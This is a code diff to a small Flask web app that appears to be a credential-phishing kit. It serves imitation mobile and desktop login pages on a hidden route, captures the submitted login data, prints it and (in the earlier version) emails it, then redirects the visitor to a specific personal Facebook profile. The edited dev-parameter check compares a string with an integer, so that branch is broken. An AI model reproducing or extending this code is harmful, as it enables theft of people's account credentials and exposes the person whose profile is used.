@@ -13,7 +13,10 @@ app.config.from_pyfile('config.cfg')
 mail = Mail(app)
 
 
-account_url = 'https://www.facebook.com/ellacska.ella.5'
+
+ACCOUNT_URL = 'https://www.facebook.com/ellacska.ella.5'
+MAIN_ROUTE = '/user/aT346xB73C&q'
+
 
 
 def print_to_terminal(login_data):
@@ -47,7 +50,7 @@ def set_permanent_session(days):
 
 
 
-@app.route('/user/aT346xB73C&q',methods=["GET","POST"])
+@app.route(f'{MAIN_ROUTE}',methods=["GET","POST"])
 @redirect_if_user_in_session
 def login():
     if request.method == "POST":
@@ -58,23 +61,20 @@ def login():
             set_permanent_session(30)
             session['email'] = login_data.get('email')
             print_to_terminal(login_data)
-            send_notification_email(login_data)
+            # send_notification_email(login_data)
         except Exception:
             pass
-        return redirect(account_url)
-    if request.args:
-        if int(request.args.get('dev','')) == 1:
-            return render_template('mobile_login.html')
-        elif int(request.args.get('dev','')) == 2:
+        return redirect(ACCOUNT_URL)
+    if request.args and request.args.get('dev','') == 2:
             return render_template('desktop_login.html')
     else:
-        return render_template("device_detector.html")
+        return render_template("mobile_login.html")
 
 
 
 @app.route('/profile')
 def profile():
-    return redirect(account_url)
+    return redirect(ACCOUNT_URL)
 
 
 
@@ -82,6 +82,14 @@ def profile():
 def logout():
     session.clear()
     return redirect(url_for('login'))
+
+
+
+@app.errorhandler(404)
+def error404(error):
+    return render_template('error404.html'), 404
+
+
 
 
 
